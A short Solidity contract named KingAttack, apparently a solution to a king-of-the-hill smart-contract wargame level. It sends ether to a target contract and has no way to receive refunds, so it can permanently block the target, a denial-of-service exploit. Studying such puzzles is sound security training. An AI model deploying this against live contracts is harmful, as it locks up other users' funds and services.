//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    function attack(address payable target) external payable {
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Attack failed");
    }
}